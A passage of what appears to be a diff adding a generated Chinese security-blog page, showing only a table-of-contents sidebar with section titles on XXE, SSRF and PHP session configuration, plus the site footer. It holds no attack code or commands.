toc-link" href="#作用"><span class="toc-text">作用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#漏洞原理"><span class="toc-text">漏洞原理</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#普通实体引入外部实体"><span class="toc-text">普通实体引入外部实体</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#参数实体引入外部实体"><span class="toc-text">参数实体引入外部实体</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#支持的协议"><span class="toc-text">支持的协议</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#XXE简介"><span class="toc-text">XXE简介</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#XXE的危害"><span class="toc-text">XXE的危害</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#读取任意文件"><span class="toc-text">读取任意文件</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#执行系统命令"><span class="toc-text">执行系统命令</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#Dos拒绝服务攻击"><span class="toc-text">Dos拒绝服务攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#介绍"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#原理示例"><span class="toc-text">原理示例</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#SSRF综合训练"><span class="toc-text">SSRF综合训练</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#补充"><span class="toc-text">补充</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#PHP中Session配置问题"><span class="toc-text">PHP中Session配置问题</span></a></li></ol></li></ol></div>
+    </div>
+    
+    
+    
+    
+    <hr>
+    <div class="blogroll sidebar-item">
+      <div><i class="fas fa-link"></i>友情链接</div>
+      <ul>
+        
+        <li><i class="fas fa-link"></i><a href="https://github.com/TuringGu" target="_blank">GitHub</a></li>
+        
+      </ul>
+    </div>
+    
+  </div>
+</aside>
+
+
+          
+        </div>
+      </div>
+    </main>
+    
+<footer id="footer" class="footer" style="background: #33363b;">
+  <div class="container">
+    <div class="back-to-top">
+      <button id="back-to-top"><i class="fas fa-angle-double-up" aria-label="回到顶部"></i></button>
+    </div>
+    <div class="footer-container">
+      <div class="footer-left">
+        <div class="copyright">
+          <span class="author">TuringGu</span><span class="year"><i class="far fa-copyright"></i>2018 - 2019</span><span class="creative-commons"><i class="fab fa-creative-commons"></i><a href="http://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">BY-NC-ND 4.0</a></span>
+        </div>
+        
+        <div class="busuanzi">
+          <span id="busuanzi_container_site_pv"><i class="fas fa-eye" aria-label="站点点击量" aria-hidden="false"></i><span id="busuanzi_value_site_pv"></span></span><span id="busuanzi_container_site_uv"><i class="fas fa-user" aria-label="站点用户数" aria-hidden="false"></i><span id="busuanzi_value_site_uv"></span></span><span id="busuanzi_container_page_pv"><i class="far fa-file-alt"></i><span id="busuanzi_value_page_pv" aria-label="页面点击量" aria-hidden="false"></span></span>
+        </div>
+        
+      </div>
+      <div class="footer-right">
+        <div class="custom-info">
+          
+          托管于<i class="fab fa-github-alt"></i><a href="https://pages.github.com/" target="_blank">GitHub Pages</a>
+          
+        </div>
+        <div class="powered-by">
+          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  </body>
+</html>
